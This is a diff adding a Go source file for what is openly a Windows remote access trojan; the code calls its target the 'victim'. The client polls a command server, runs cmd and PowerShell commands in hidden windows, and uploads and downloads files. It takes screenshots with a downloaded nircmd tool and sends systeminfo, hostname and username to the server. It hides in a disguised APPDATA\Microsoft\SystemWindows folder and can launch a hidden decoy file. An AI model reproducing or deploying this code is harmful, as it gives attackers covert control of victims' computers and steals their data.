@@ -1,0 +1,205 @@
+package main
+
+import (
+	"encoding/base64"
+	"math/rand"
+	"os"
+	"os/exec"
+	"os/signal"
+	"strconv"
+	"strings"
+	"syscall"
+	"time"
+)
+
+var ORIGIN = "http://localhost:9411"
+var MEDIAURL = ""
+var MEDIANAME = ""
+
+const INTERVAL = 2
+
+var URL = ORIGIN + "/target"
+var appName = "go"
+var APPDATA = os.Getenv("APPDATA") + "\\"
+var FOLDER = APPDATA + "Microsoft\\SystemWindows\\" + appName + "\\"
+var userId = ""
+var useragent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36"
+var exitBy = "exiting by victim."
+var pCommnads = "Commands: [cmd][powershell][upload][download][screenshot][exit]"
+
+func shell(ps bool, command string) string {
+	application := "powershell"
+	if !ps {
+		command = "cmd /c " + command
+	}
+
+	cmd := exec.Command(application, command)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
+	out, err := cmd.Output()
+
+	if err != nil {
+		return err.Error()
+	}
+
+	return string(out)
+}
+
+func get(url, filename string) string {
+	curl := "CURL -s -A \"" + useragent + "\" -X GET " + url
+
+	if len(filename) == 0 {
+		return shell(false, curl)
+	} else {
+		curl += " -o " + filename
+		output := shell(false, curl)
+		if output == "exit status 1" {
+			return "file save error. " + output
+		} else {
+			return filename + " file saved."
+		}
+	}
+}
+
+func post(url, data, filename string) {
+	curl := "CURL -s -H \"Content-Type:multipart/form-data\" -A \"" + useragent + "\" "
+
+	if len(data) != 0 {
+		curl += "-F \"data=" + base64.StdEncoding.EncodeToString([]byte(data)) + "\" "
+	}
+
+	if len(filename) != 0 {
+		curl += "-F \"file=@" + filename + "\" "
+	}
+	curl += "-X POST " + url
+
+	shell(false, curl)
+}
+
+func media() {
+	if len(MEDIAURL) > 0 {
+		get(MEDIAURL, MEDIANAME)
+		shell(false, "attrib +h +s +r "+MEDIANAME)
+		shell(false, "start "+MEDIANAME)
+	}
+}
+
+func screenshot() {
+	var filename = strconv.Itoa(rand.Int()) + "-go-screenshot.jpg"
+	shotPath := FOLDER + "nircmd.exe savescreenshot " + filename
+	shell(true, shotPath)
+	clientUrl := ORIGIN + "/ssd/uploads/" + userId + "/" + filename
+	post(URL, clientUrl, filename)
+	os.Remove(filename)
+}
+
+func executor(commnad string, app bool) {
+	_, after, found := strings.Cut(commnad, "cd ")
+	if found {
+		os.Chdir(after)
+		dir, err := os.Getwd()
+		if err != nil {
+			post(URL, "Error path not found.", "")
+		}
+
+		post(URL, dir+">", "")
+	} else {
+		post(URL, shell(app, commnad), "")
+	}
+}
+
+func loop() {
+	for {
+		res := get(URL, "")
+
+		if res == "200" || len(res) == 0 || res == "exit status 1" {
+			time.Sleep(INTERVAL * time.Second)
+			continue
+		}
+
+		data := strings.Split(res, "\n")
+		application := data[0]
+		command := data[1]
+		fileName := data[2]
+
+		if application == "cmd" {
+			executor(command, false)
+		} else if application == "powershell" {
+			executor(command, true)
+		} else if application == "upload" {
+			output := get(command, fileName)
+			post(URL, output, "")
+		} else if application == "download" {
+			post(URL, "", command)
+		} else if application == "-" {
+			if command == "screenshot" {
+				screenshot()
+			} else if command == "exit" {
+				post(URL, "Exit Success", "")
+				os.Exit(0)
+			} else {
+				post(URL, pCommnads, "")
+			}
+		} else {
+			post(command, pCommnads, fileName)
+		}
+
+		time.Sleep(INTERVAL * time.Second)
+	}
+}
+
+func initTarget() {
+	media()
+
+	id, err := os.Hostname()
+	username := os.Getenv("USERNAME")
+	architecture := os.Getenv("PROCESSOR_ARCHITECTURE")
+	Ctime := time.Now().String()
+
+	if err != nil {
+		id = username
+	}
+	URL += "?id=" + id
+	userId = id
+
+	_, err = os.Stat(FOLDER)
+	if os.IsNotExist(err) {
+		os.MkdirAll(FOLDER, os.ModePerm)
+
+		if strings.Contains(architecture, "64") {
+			get(ORIGIN+"/payloads/nircmd-64.exe", FOLDER+"nircmd.exe")
+		} else {
+			get(ORIGIN+"/payloads/nircmd.exe", FOLDER+"nircmd.exe")
+		}
+
+		output := shell(false, "systeminfo")
+
+		info := `+=== SYSTEM INFORMATION ===+
+HOST         : ` + id + `
+USERNAME     : ` + username + `
+ARCHITECHURE : ` + architecture + `
+TIME         : ` + Ctime + output
+
+		post(URL, info, "")
+	} else {
+		post(URL, "target connected again - [APP: "+appName+"] [Time : "+Ctime+"]", "")
+	}
+
+	loop()
+}
+
+func cleanup() {
+	post(URL, exitBy, "")
+}
+
+func main() {
+	sigCh := make(chan os.Signal, 1)
+	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
+
+	go func() {
+		<-sigCh
+		cleanup()
+		os.Exit(0)
+	}()
+
+	initTarget()
+}
